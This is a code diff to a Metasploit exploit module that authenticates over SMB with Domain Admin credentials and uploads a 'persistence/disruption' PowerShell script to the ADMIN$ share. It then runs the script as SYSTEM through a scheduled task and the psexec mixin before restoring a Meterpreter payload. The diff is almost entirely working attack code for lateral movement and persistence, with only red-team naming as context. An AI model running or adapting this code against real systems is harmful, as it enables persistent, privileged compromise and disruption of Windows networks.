@@ -150,37 +150,36 @@ class MetasploitModule < Msf::Exploit::Remote
       smb_login
       print_good("Successfully authenticated with Domain Admin credentials")
 
-      # Upload persistence script to ADMIN$
-      share = 'ADMIN$'
-      remote_path = 'Windows\\ManageGlobalService.ps1'
-      script_data = persistence_script
-
+      # === CORRECT UPLOAD BLOCK FOR METASPLOIT 6.4+ (RubySMB) ===
       print_status("Uploading persistence/disruption script to ADMIN$ share...")
-      tree = smb_client.tree_connect(share)
-      file = tree.open_file(remote_path, 'rwct', '0', '0', '0')
-      file.write(script_data)
-      file.close
-      print_good("Uploaded persistence/disruption script to \\\\#{datastore['RHOST']}\\#{share}\\#{remote_path}")
+      share_unc = "\\\\#{rhost}\\ADMIN$"
+      simple.connect(share_unc)
 
-      # Execute the script immediately via scheduled task (using psexec-style service creation for reliability)
-      exec_cmd = "schtasks /create /tn \"RedTeamPersistence\" /tr \"powershell -ExecutionPolicy Bypass -File C:\\Windows\\ManageGlobalService.ps1\" /sc once /st 00:00 /ru SYSTEM /f && schtasks /run /tn \"RedTeamPersistence\""
+      remote_path = "\\Windows\\redteam_persistence.ps1"
+      fd = smb_open(remote_path, 'rwct', write: true)
+      fd << persistence_script
+      fd.close
 
-      # Use the Psexec mixin to execute the command reliably (original enhancement: persistence BEFORE payload)
+      print_good("Uploaded persistence/disruption script to \\\\#{rhost}\\ADMIN$#{remote_path}")
+
+      # Execute the script immediately via scheduled task
+      exec_cmd = "schtasks /create /tn \"RedTeamPersistence\" /tr \"powershell -ExecutionPolicy Bypass -File C:\\Windows\\redteam_persistence.ps1\" /sc once /st 00:00 /ru SYSTEM /f && schtasks /run /tn \"RedTeamPersistence\""
+
       print_status("Executing persistence script via scheduled task...")
-      self.simple = true  # For psexec mixin
+
+      # Use Psexec mixin for reliable execution
+      self.simple = true
       self.smb_share = 'ADMIN$'
       self.service_name = 'RedTeamSvcTemp'
       self.service_display_name = 'RedTeam Temporary Execution'
 
-      # Temporarily use windows/exec payload for the persistence command
       original_payload = payload
       cmd_payload = framework.payloads.create('windows/exec')
       cmd_payload.datastore['CMD'] = exec_cmd
       self.payload = cmd_payload
 
-      super  # Leverage psexec mixin to run the command
+      super  # Run the persistence command
 
-      # Restore original Meterpreter payload
       self.payload = original_payload
 
       print_good("Persistence script executed successfully!")
